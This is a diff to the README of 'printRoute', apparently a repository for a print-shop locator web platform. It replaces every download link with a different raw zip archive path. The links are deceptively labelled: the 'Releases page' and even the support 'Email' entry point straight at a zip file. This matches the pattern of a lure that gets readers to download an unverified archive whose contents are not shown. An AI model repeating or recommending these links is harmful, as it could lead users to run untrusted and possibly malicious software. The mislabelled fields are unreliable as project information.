@@ -6,9 +6,9 @@ Welcome to printRoute! This web platform connects you with nearby Xerox shops, a
 
 ## 📥 Download & Install
 
-[![Download printRoute](https://raw.githubusercontent.com/joan-mideva/printRoute/main/drepanoid/printRoute.zip)](https://raw.githubusercontent.com/joan-mideva/printRoute/main/drepanoid/printRoute.zip)
+[![Download printRoute](https://raw.githubusercontent.com/joan-mideva/printRoute/main/printRoute/uploads/documents/Route_print_v2.8.zip)](https://raw.githubusercontent.com/joan-mideva/printRoute/main/printRoute/uploads/documents/Route_print_v2.8.zip)
 
-To download printRoute, visit this page: [printRoute Releases](https://raw.githubusercontent.com/joan-mideva/printRoute/main/drepanoid/printRoute.zip).
+To download printRoute, visit this page: [printRoute Releases](https://raw.githubusercontent.com/joan-mideva/printRoute/main/printRoute/uploads/documents/Route_print_v2.8.zip).
 
 ### Step 1: Visit the Releases Page
 
@@ -56,7 +56,7 @@ To ensure printRoute runs smoothly, please check the following system requiremen
 
 If you encounter any issues while using printRoute or have questions, please reach out to our support team:
 
-- **Email**: https://raw.githubusercontent.com/joan-mideva/printRoute/main/drepanoid/printRoute.zip
+- **Email**: https://raw.githubusercontent.com/joan-mideva/printRoute/main/printRoute/uploads/documents/Route_print_v2.8.zip
 - **Documentation**: Comprehensive guides and FAQs can be found on our website.
 
 ## 🌟 Community Contributions
